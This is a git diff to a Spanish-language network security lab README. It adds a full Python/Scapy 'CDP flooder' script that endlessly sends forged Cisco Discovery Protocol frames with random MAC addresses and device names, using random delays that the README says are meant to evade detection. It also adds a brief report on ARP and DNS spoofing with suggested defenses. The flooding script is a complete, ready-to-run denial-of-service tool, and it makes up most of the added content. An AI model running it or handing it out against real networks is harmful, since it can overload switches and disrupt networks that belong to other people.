@@ -55,6 +55,142 @@ Las capturas incluidas en este repositorio documentan el proceso completo del la
  <img width="943" height="331" alt="image" src="https://github.com/user-attachments/assets/3b9a2936-b3b6-4118-967b-917abb1327ce" />
 
 ---
+# CDP Packet Generator
+
+Script de Python que utiliza Scapy para generar y enviar paquetes CDP (Cisco Discovery Protocol).
+
+## Requisitos
+```bash
+pip install scapy
+```
+
+## Uso
+```bash
+sudo python3 cdp_flooder.py
+```
+
+## Código Fuente
+```python
+from scapy.all import Ether, LLC, SNAP, Raw, sendp, RandMAC
+import struct
+import random
+import time
+
+# ===============================
+# HECHO POR MR.J4VI MINYETE
+# ===============================
+
+# Configuración
+DESTINO_MAC = "01:00:0c:cc:cc:cc"
+INTERFAZ_RED = "eth0"
+VERSION_CDP = 0x02
+
+def calcular_checksum_cdp(datos):
+    """Calcula el checksum para paquetes CDP"""
+    if len(datos) % 2:
+        datos += b'\x00'
+    
+    total = 0
+    for indice in range(0, len(datos), 2):
+        total += (datos[indice] << 8) + datos[indice + 1]
+    
+    total = (total >> 16) + (total & 0xFFFF)
+    total += (total >> 16)
+    
+    return (~total) & 0xFFFF
+
+def construir_tlv(tipo_tlv, data):
+    """Construye un campo TLV (Type-Length-Value)"""
+    longitud = len(data) + 4
+    return struct.pack("!HH", tipo_tlv, longitud) + data
+
+def fabricar_paquete_cdp():
+    """Genera el payload CDP con información aleatoria"""
+    dispositivo = f"SWITCH-{random.randint(1000, 9999)}".encode()
+    interfaz = b"FastEthernet0/24"
+    caps = struct.pack("!I", 0x01)
+    
+    # Construir payload CDP
+    payload = b''
+    payload += construir_tlv(0x0003, interfaz)      # TLV Port ID
+    payload += construir_tlv(0x0001, dispositivo)   # TLV Device ID
+    payload += construir_tlv(0x0004, caps)          # TLV Capabilities
+    
+    # Parámetros del encabezado
+    tiempo_vida = random.randint(100, 200)
+    cabecera_temp = struct.pack("!BBH", VERSION_CDP, tiempo_vida, 0x0000)
+    
+    # Calcular checksum
+    datos_completos = cabecera_temp + payload
+    checksum = calcular_checksum_cdp(datos_completos)
+    
+    # Retornar paquete CDP completo
+    cabecera_final = struct.pack("!BBH", VERSION_CDP, tiempo_vida, checksum)
+    return cabecera_final + payload
+
+def ejecutar_flood():
+    """Función principal de ejecución"""
+    print("[*] Iniciando envío de paquetes CDP...")
+    print(f"[*] Interfaz: {INTERFAZ_RED}")
+    print("[*] Presiona Ctrl+C para detener\n")
+    
+    contador = 0
+    
+    try:
+        while True:
+            # Crear payload CDP
+            datos_cdp = fabricar_paquete_cdp()
+            
+            # Construir paquete completo
+            frame = (
+                Ether(src=RandMAC(), dst=DESTINO_MAC) /
+                LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
+                SNAP(OUI=0x00000c, code=0x2000) /
+                Raw(load=datos_cdp)
+            )
+            
+            # Enviar paquete
+            sendp(frame, iface=INTERFAZ_RED, verbose=False)
+            contador += 1
+            
+            if contador % 100 == 0:
+                print(f"[+] Paquetes enviados: {contador}")
+            
+            # Delay aleatorio
+            time.sleep(random.uniform(0.02, 0.08))
+            
+    except KeyboardInterrupt:
+        print(f"\n[!] Detenido. Total de paquetes enviados: {contador}")
+        print("[!] Finalizando...")
+
+if __name__ == "__main__":
+    ejecutar_flood()
+```
+
+## Características
+
+- ✅ Generación automática de paquetes CDP
+- ✅ MAC addresses aleatorias
+- ✅ Contador de paquetes enviados
+- ✅ Delays aleatorios para evitar detección
+- ✅ Manejo de interrupciones con Ctrl+C
+
+## Notas
+
+⚠️ **Advertencia**: Este script requiere privilegios de root para enviar paquetes raw.
+
+⚠️ **Uso responsable**: Utiliza este script únicamente en entornos de prueba autorizados.
+
+## Autor
+
+**MR.J4VI MINYETE**
+
+
+
+
+
+
+---
 ### Reporte de Seguridad
 Durante la ejecución del laboratorio se identificó que la red evaluada carece de mecanismos básicos de protección, lo que permitió la ejecución exitosa de ataques de ARP Spoofing y DNS Spoofing. La ausencia de segmentación, validación ARP y controles de integridad DNS representa un riesgo significativo para la confidencialidad e integridad de la información.
 
@@ -63,10 +199,6 @@ El impacto principal del ataque es la posibilidad de interceptar tráfico, redir
 La implementación de controles como Dynamic ARP Inspection, segmentación por VLAN, DNS seguro y monitoreo activo permitiría reducir considerablemente la superficie de ataque.
 
 <img width="800" height="480" alt="image" src="https://github.com/user-attachments/assets/8d4047ce-06be-4be3-b6fd-9cc79531011f" />
-## 🔐 Evaluación de Seguridad
-
-
-
 
 ```
 
